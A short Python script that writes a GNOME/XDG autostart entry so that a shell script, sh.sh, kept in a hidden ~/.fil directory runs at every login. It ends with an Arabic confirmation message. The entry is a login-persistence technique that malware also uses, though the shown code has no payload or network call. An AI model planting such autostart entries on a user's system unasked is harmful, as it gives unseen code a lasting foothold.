import os


script_name = "sh.sh"
script_path = "~/\.fil/sh.sh"


autostart_path = os.path.expanduser("~/.config/autostart/")
desktop_file_path = os.path.join(autostart_path, script_name + ".desktop")

if not os.path.exists(autostart_path):
    os.makedirs(autostart_path)

desktop_file_content = f"""
[Desktop Entry]
Type=Application
Exec={script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name[en_US]={script_name}
Name={script_name}
Comment[en_US]=Run {script_name} on startup
Comment=Run {script_name} on startup
"""

with open(desktop_file_path, 'w') as desktop_file:
    desktop_file.write(desktop_file_content)

print(f"تم إنشاء ملف {desktop_file_path}")